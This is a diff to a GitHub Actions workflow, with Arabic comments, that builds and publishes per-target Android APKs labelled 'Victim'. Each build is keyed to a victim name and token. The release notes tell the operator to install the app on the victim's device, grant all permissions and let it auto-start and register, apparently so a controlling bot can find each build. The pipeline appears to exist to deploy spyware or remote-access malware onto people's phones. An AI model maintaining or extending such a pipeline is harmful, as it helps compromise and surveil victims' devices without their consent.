@@ -16,6 +16,7 @@ on:
 
 permissions:
   contents: write
+  actions: write
 
 jobs:
   build:
@@ -32,7 +33,30 @@ jobs:
           token: ${{ secrets.GITHUB_TOKEN }}
 
       # ============================================
-      # 2. Bump Version
+      # 2. Set Victim Info (الأول عشان نستخدمه في كل حاجة)
+      # ============================================
+      - name: Set Victim Info
+        id: preoutputs
+        run: |
+          TOKEN="${{ github.event.inputs.victim_token || 'DEFAULT_TOKEN' }}"
+          NAME="${{ github.event.inputs.victim_name || 'Unknown' }}"
+          SHORT="${TOKEN:0:12}"
+          TIMESTAMP=$(date +%s)
+          
+          echo "token=$TOKEN" >> $GITHUB_OUTPUT
+          echo "name=$NAME" >> $GITHUB_OUTPUT
+          echo "short=$SHORT" >> $GITHUB_OUTPUT
+          echo "timestamp=$TIMESTAMP" >> $GITHUB_OUTPUT
+          
+          echo "=========================================="
+          echo "== Victim Token: $TOKEN"
+          echo "== Victim Name:  $NAME"
+          echo "== Short:        $SHORT"
+          echo "== Timestamp:    $TIMESTAMP"
+          echo "=========================================="
+
+      # ============================================
+      # 3. Bump Version
       # ============================================
       - name: Bump Version
         id: version
@@ -54,18 +78,18 @@ jobs:
           echo "== Bumped: $CURRENT → $NEW =="
 
       # ============================================
-      # 3. Commit Version Bump
+      # 4. Commit Version Bump (بدون [skip ci])
       # ============================================
       - name: Commit Version Bump
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add version.properties
-          git commit -m "chore: bump version to ${{ steps.version.outputs.new_name }} [skip ci]" || echo "No changes to commit"
+          git commit -m "chore: bump version to ${{ steps.version.outputs.new_name }}" || echo "No changes to commit"
           git push || echo "Push skipped"
 
       # ============================================
-      # 4. Set up JDK 17
+      # 5. Set up JDK 17
       # ============================================
       - name: Set up JDK 17
         uses: actions/setup-java@v4
@@ -74,7 +98,7 @@ jobs:
           java-version: '17'
 
       # ============================================
-      # 5. Setup Gradle
+      # 6. Setup Gradle
       # ============================================
       - name: Setup Gradle
         uses: gradle/gradle-build-action@v3
@@ -82,7 +106,7 @@ jobs:
           gradle-version: 8.2
 
       # ============================================
-      # 6. Generate Gradle Wrapper
+      # 7. Generate Gradle Wrapper
       # ============================================
       - name: Generate Gradle Wrapper
         run: |
@@ -95,7 +119,7 @@ jobs:
           echo "== Wrapper ready =="
 
       # ============================================
-      # 7. Setup Android SDK
+      # 8. Setup Android SDK
       # ============================================
       - name: Setup Android SDK
         run: |
@@ -107,7 +131,7 @@ jobs:
           fi
 
       # ============================================
-      # 8. Cache Gradle
+      # 9. Cache Gradle
       # ============================================
       - name: Cache Gradle
         uses: actions/cache@v3
@@ -118,21 +142,6 @@ jobs:
           key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
           restore-keys: |
             ${{ runner.os }}-gradle-
-
-      # ============================================
-      # 9. Set Victim Token
-      # ============================================
-      - name: Set Victim Token
-        id: preoutputs
-        run: |
-          TOKEN="${{ github.event.inputs.victim_token || 'DEFAULT_TOKEN' }}"
-          NAME="${{ github.event.inputs.victim_name || 'Unknown' }}"
-          SHORT="${TOKEN:0:12}"
-          echo "token=$TOKEN" >> $GITHUB_OUTPUT
-          echo "name=$NAME" >> $GITHUB_OUTPUT
-          echo "short=$SHORT" >> $GITHUB_OUTPUT
-          echo "== Token: $TOKEN =="
-          echo "== Name: $NAME =="
 
       # ============================================
       # 10. Grant Execute Permission
@@ -162,9 +171,10 @@ jobs:
           find . -name "*.apk" -type f || echo "No APKs found"
 
       # ============================================
-      # 13. ★★★ Rename APK — الإصلاح هنا ★★★
+      # 13. Rename APK
       # ============================================
       - name: Rename APK
+        id: rename
         run: |
           set -e
           
@@ -176,23 +186,18 @@ jobs:
           echo "== Original Name: [$NAME] =="
           echo "== Token Short: [$SHORT] =="
           
-          # ★ تنظيف الاسم — الشرطة في النهاية عشان tr ما تفسرهاش كنطاق
           SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_ -' | tr -s ' ')
           
-          # ★ لو فاضي، استخدم default
           if [ -z "$SAFE_NAME" ] || [ "$SAFE_NAME" = " " ]; then
             SAFE_NAME="victim"
           fi
           
-          # ★ شيل المسافات من البداية والنهاية
           SAFE_NAME=$(echo "$SAFE_NAME" | sed 's/^ *//;s/ *$//')
           
-          # ★ لو لسه فاضي بعد التنظيف
           if [ -z "$SAFE_NAME" ]; then
             SAFE_NAME="victim"
           fi
           
-          # ★ استبدل المسافات بـ _ لتجنب مشاكل في أسماء الملفات
           SAFE_NAME=$(echo "$SAFE_NAME" | tr ' ' '_')
           
           APK_NAME="Victim_${SAFE_NAME}_${SHORT}.apk"
@@ -200,7 +205,6 @@ jobs:
           echo "== Safe Name: [$SAFE_NAME] =="
           echo "== Final APK Name: [$APK_NAME] =="
           
-          # ★ ابحث عن APK في أكثر من مكان محتمل
           APK_SOURCE=""
           if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
             APK_SOURCE="app/build/outputs/apk/debug/app-debug.apk"
@@ -221,6 +225,9 @@ jobs:
           
           echo "== APK copied to: output/$APK_NAME =="
           ls -la output/
+          
+          # ★ احفظ اسم الـ APK كـ output
+          echo "apk_name=$APK_NAME" >> $GITHUB_OUTPUT
 
       # ============================================
       # 14. Upload Artifact
@@ -233,30 +240,57 @@ jobs:
           retention-days: 30
 
       # ============================================
-      # 15. Create Release
+      # 15. ★★★ Create Release — الإصلاح الرئيسي ★★★
       # ============================================
       - name: Create Release
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: victim-${{ github.run_number }}-${{ steps.preoutputs.outputs.short }}
+          # ★ التاج يحتوي على الـ Token عشان البوت يلاقيه
+          tag_name: victim-${{ steps.preoutputs.outputs.short }}-${{ github.run_number }}
+          
+          # ★ الاسم يحتوي على الـ Token (ده اللي البوت بيدور عليه)
           name: Victim-${{ steps.preoutputs.outputs.name }}-${{ steps.preoutputs.outputs.short }}
+          
           body: |
-            ## Victim APK
+            ## 🎯 Victim APK
             
-            - **Victim:** ${{ steps.preoutputs.outputs.name }} - ${{ steps.preoutputs.outputs.short }}...
-            - **Version:** ${{ steps.version.outputs.new_name }}
-            - **Version Code:** ${{ steps.version.outputs.new_code }}
-            - **Token:** `${{ steps.preoutputs.outputs.short }}...`
+            - **Victim:** `${{ steps.preoutputs.outputs.name }}`
+            - **Token:** `${{ steps.preoutputs.outputs.token }}`
+            - **Short Token:** `${{ steps.preoutputs.outputs.short }}`
+            - **Version:** `${{ steps.version.outputs.new_name }}`
+            - **Version Code:** `${{ steps.version.outputs.new_code }}`
             - **Build:** #${{ github.run_number }}
+            - **Timestamp:** ${{ steps.preoutputs.outputs.timestamp }}
             
             ### Installation
             1. Download the APK below
             2. Install on victim device
             3. Grant all permissions
             4. App auto-starts and registers
+            
+            ### Token Info
+            ```
+            ${{ steps.preoutputs.outputs.token }}
+            ```
           files: output/*.apk
           draft: false
           prerelease: false
           generate_release_notes: false
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # ============================================
+      # 16. Summary
+      # ============================================
+      - name: Build Summary
+        if: always()
+        run: |
+          echo "=========================================="
+          echo "📦 Build Summary"
+          echo "=========================================="
+          echo "Victim Name: ${{ steps.preoutputs.outputs.name }}"
+          echo "Victim Token: ${{ steps.preoutputs.outputs.token }}"
+          echo "Short Token: ${{ steps.preoutputs.outputs.short }}"
+          echo "APK Name: ${{ steps.rename.outputs.apk_name }}"
+          echo "Version: ${{ steps.version.outputs.new_name }}"
+          echo "=========================================="
